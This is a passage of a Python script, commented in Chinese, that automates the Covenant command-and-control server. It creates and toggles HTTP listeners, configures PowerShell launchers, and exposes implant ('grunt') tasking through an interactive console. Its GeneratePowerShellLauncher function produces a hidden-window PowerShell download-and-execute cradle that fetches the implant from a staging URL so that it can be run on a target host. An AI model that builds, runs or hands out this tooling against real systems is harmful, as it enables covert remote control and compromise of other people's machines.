        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        resdata = copy.deepcopy(data)
        savecolumns = ['Id','Name','Description','Type']
        for i in range(len(data)):
            for j in data[i].keys():
                if j not in savecolumns:
                    del resdata[i][j]
        return {
            "Success": True,
            "Profiles": resdata
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetProfiles接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetProfiles接口错误: {e}  ResponseData: {response.text}"
        }
    
def GetListeners() -> dict:
    """
    获取所有监听器(Listener)信息

    Returns:
        dict: 包含所有Listener信息字典的数组
    """
    api = f"/api/listeners"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        resdata = copy.deepcopy(data)
        savecolumns = ['Id','Name','UseSSL','SSLCertificatePassword','Urls','BindAddress','BindPort','ConnectAddresses','ConnectPort','ProfileId','ListenerTypeId','Status','StartTime']
        for i in range(len(data)):
            for j in data[i].keys():
                if j not in savecolumns:
                    del resdata[i][j]
        return {
            "Success": True,
            "Listeners": resdata
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetListeners接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetListeners接口错误: {e}  ResponseData: {response.text}"
        }

def GetListener(ListenerId:int) -> dict:
    """
    获取指定监听器(Listener)详细信息

    Args:
        ListenerId (int): 监听器ID

    Returns:
        dict: 包含Listener信息字典的数组
    """
    api = f"/api/listeners/{ListenerId}"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        return {
            "Success": True,
            "Listener": data
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetListener接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetListener接口错误: {e}  ResponseData: {response.text}"
        }

def DeleteListener(ListenerId:int) -> dict:
    """
    删除指定的Listener

    Args:
        ListenerId (int): 监听器ID

    Returns:
        dict: 包含执行结果的字典

    """
    api = f"/api/listeners/{ListenerId}"
    try:
        response = requests.delete(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        return {
            "Success": True
        }
    except requests.exceptions.RequestException as e:
        print(f"调用DeleteListener接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用DeleteListener接口错误: {e}  ResponseData: {response.text}"
        }

def CreateHttpListener(name:str,description:str,bindAddress:str,bindPort:int,connectAddresses:list[str],connectPort:int,urls:list[str],profileId:int=1,listenerTypeId:int=1,useSSL:bool=False,sslCertificate:str="",sslCertificatePassword:str="") -> dict:
    """
    创建HTTP监听器(Listener)

    Args:
       name (str): 监听器名称
       description (str): 监听器描述
       bindAddress (str): 绑定地址, 例 0.0.0.0
       bindPort (int): 绑定端口, 例 4444
       connectAddresses (list[str]): 连接地址列表, 例 ["10.12.28.33"]
       connectPort (int): 连接端口, 例 4444
       urls (list[str]): URL列表, 例 ["http://10.12.28.33:4444"]
       profileId (int): 配置文件ID, 默认 1
       listenerTypeId (int): 监听器类型ID, 默认 1
       useSSL (bool): 是否使用SSL, 默认 False
       sslCertificate (str): PFX文件Base64后的值, 如果启用SSL才需要传递, 默认 ""
       sslCertificatePassword (str): PFX密码, 如果启用SSL才需要传递, 默认 ""

    Return:
       dict: 返回创建监听器的结果, 如果创建成功返回监听器的Id
    """
    api = "/api/listeners/http"

    payload = json.dumps({
        "name": name,
        "description": description,
        "bindAddress": bindAddress,
        "bindPort": bindPort,
        "connectAddresses": connectAddresses,
        "connectPort": connectPort,
        "urls": urls,
        "profileId": profileId,
        "listenerTypeId": listenerTypeId,
        "useSSL": useSSL,
        "sslCertificate": sslCertificate,
        "sslCertificatePassword": sslCertificatePassword,
        "status": "active"
    })
    try:
        response = requests.post(CovenantURL+api, headers=Auth, data=payload, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            return {
                "Success": True,
                "ListenerId": data['Id']
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用CreateHttpListener接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用CreateHttpListener接口错误: {e}  ResponseData: {response.text}"
        }
    
def ActionListener(ListenerId:int, Action:bool) -> dict:
    """
    停止或启动指定的监听器

    Args:
        ListenerId (int): 监听器ID
        Action (bool): True表示启动监听器，False表示停止监听器

    Return:
        dict: 包含操作结果的字典
    """
    api = f"/api/listeners"

    rawListener = GetListener(ListenerId)
    if not rawListener["Success"]:
        return rawListener
    rawListener = rawListener['Listener']

    rawListener['Status'] = "active" if Action else "stopped"

    payload = json.dumps(rawListener)
    try:
        response = requests.put(CovenantURL+api, headers=Auth, data=payload, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            return {
                "Success": True
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用ActionListener接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用ActionListener接口错误: {e}  ResponseData: {response.text}"
        }

def GetLaunchers() -> dict:
    """
    获取所有Launchers的信息

    Returns:
       dict: 包含Launchers信息的字典列表,
    """
    api = f"/api/launchers"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        resdata = copy.deepcopy(data)
        savecolumns = ['Id','Name','Description','Type']
        for i in range(len(data)):
            for j in data[i].keys():
                if j not in savecolumns:
                    del resdata[i][j]
        return {
            "Success": True,
            "Launchers": resdata
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetLaunchers接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetLaunchers接口错误: {e}  ResponseData: {response.text}"
        }

def GetPowerShellLauncher() -> dict:
    """
    获取PowerShell Launcher信息

    Return:
        dict: 包含PowerShell Launcher信息的字典
    """
    api = f"/api/launchers/powershell"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            return {
                "Success": True,
                "Launcher": data
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用GetPowerShellLauncher接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetPowerShellLauncher接口错误: {e}  ResponseData: {response.text}"
        }
    
def EditPowerShellLauncher(ListenerId:int, Delay:int, JitterPercent:int, ConnectAttempts:int, KillDate:str, DotNetVersion:str, ImplantTemplateId:int, ValidateCert:bool, UseCertPinning:bool) -> dict:
    """
    编辑PowerShell Launcher配置
    
    Args:
        ListenerId (int): 监听器ID
        KillDate (str): 结束时间 (格式: YYYY-MM-DDTHH:MM:SS)
        DotNetVersion (str): .NET版本, 从"net35", "net40", "NetCore31"中选择
        Delay (int): 延迟时间（秒）, Defaults to 1
        JitterPercent (int): 抖动百分比, Defaults to 0
        ConnectAttempts (int): 连接尝试次数, Defaults to 5000
        ImplantTemplateId (int, optional): 植入模板ID. Defaults to 1.
        ValidateCert (bool, optional): 是否验证证书. Defaults to True.
        UseCertPinning (bool, optional): 是否使用证书固定. Defaults to True.

    Returns:
       dict: 包含编辑结果的字典
    """
    api = f"/api/launchers/powershell"

    rawLauncher = GetPowerShellLauncher()
    if not rawLauncher["Success"]:
        return rawLauncher
    rawLauncher = rawLauncher['Launcher']

    rawLauncher['ListenerId'] = ListenerId
    rawLauncher['Delay'] = Delay
    rawLauncher['JitterPercent'] = JitterPercent
    rawLauncher['ConnectAttempts'] = ConnectAttempts
    rawLauncher['KillDate'] = KillDate
    rawLauncher['DotNetVersion'] = DotNetVersion
    rawLauncher['ImplantTemplateId'] = ImplantTemplateId
    rawLauncher['ValidateCert'] = ValidateCert
    rawLauncher['UseCertPinning'] = UseCertPinning

    payload = json.dumps(rawLauncher)
    try:
        response = requests.put(CovenantURL+api, headers=Auth, data=payload, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            return {
                "Success": True,
                "Launcher": data
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用EditPowerShellLauncher接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用EditPowerShellLauncher接口错误: {e}  ResponseData: {response.text}"
        }
    
def GeneratePowerShellLauncher(ListenerId:int, KillDate:str, DotNetVersion:str, Delay:int=1, JitterPercent:int=0, ConnectAttempts:int=5000, ImplantTemplateId:int=1, ValidateCert:bool=True, UseCertPinning:bool=True) -> dict:
    """
    通过PowerShell Launcher生成ShellCode连接代码
    
    Args:
        ListenerId (int): 监听器ID
        KillDate (str): 结束时间 (格式: YYYY-MM-DDTHH:MM:SS)
        DotNetVersion (str): .NET版本, 从"net35", "net40", "NetCore31"中选择
        Delay (int): 延迟时间（秒）, Defaults to 1
        JitterPercent (int): 抖动百分比, Defaults to 0
        ConnectAttempts (int): 连接尝试次数, Defaults to 5000
        ImplantTemplateId (int, optional): 植入模板ID. Defaults to 1.
        ValidateCert (bool, optional): 是否验证证书. Defaults to True.
        UseCertPinning (bool, optional): 是否使用证书固定. Defaults to True.
    
    Return:
       dict: 包含生成的LauncherString的字典, 格式如下：
       {
           "Success": True,
           "LauncherString": "ShellCode启动代码, 在主机上运行这段代码即可连接",
           "LauncherFileUrl": "ShellCode暂存URL地址"
       }
    """
    api = "/api/launchers/powershell"
    editres = EditPowerShellLauncher(ListenerId, Delay, JitterPercent, ConnectAttempts, KillDate, DotNetVersion, ImplantTemplateId, ValidateCert, UseCertPinning)
    if not editres['Success']: return editres

    try:
        response = requests.post(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            url, mine = SaveFile_To_Url(data['LauncherString'].split("\"")[1], True)
            LauncherString = f"powershell -Sta -Nop -Window Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('{url}')\""
            return {
                "Success": True,
                "LauncherString": LauncherString,
                "LauncherFileUrl": url
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用GeneratePowerShellLauncher接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GeneratePowerShellLauncher接口错误: {e}  ResponseData: {response.text}"
        }

my_namespace = {
    "login": login,
    "GetGruntCommands": GetGruntCommands,
    "GetGruntCommandsCount": GetGruntCommandsCount,
    "Username_Get_UserID": Username_Get_UserID,
    "CreateGruntCommand": CreateGruntCommand,
    "CreateGruntTasking": CreateGruntTasking,
    "DoTasking": DoTasking,
    "GetAvailableGruntTasksByGrunt": GetAvailableGruntTasksByGrunt,
    "GetGruntTasks": GetGruntTasks,
    "GetGruntTask": GetGruntTask,
    "EditGruntTask": EditGruntTask,
    "GetGrunt": GetGrunt,
    "GetGrunts": GetGrunts,
    "GetActiveGrunts": GetActiveGrunts,
    "GetListenerTypes": GetListenerTypes,
    "GetProfiles": GetProfiles,
    "GetListeners": GetListeners,
    "CreateHttpListener": CreateHttpListener,
    "GetLaunchers": GetLaunchers,
    "GeneratePowerShellLauncher": GeneratePowerShellLauncher,
    "ActionListener": ActionListener,
    "GetListener": GetListener,
    "DeleteListener": DeleteListener,
    "EditGrunt": EditGrunt
}

if __name__ == "__main__":
    login("1","1")

    thread = threading.Thread(target=run_app)
    thread.daemon = True
    thread.start()

    event_thread = threading.Thread(target=start_event_checking)
    event_thread.daemon = True
    event_thread.start()

    code.InteractiveConsole(locals=my_namespace).interact("欢迎使用我的脚本！")
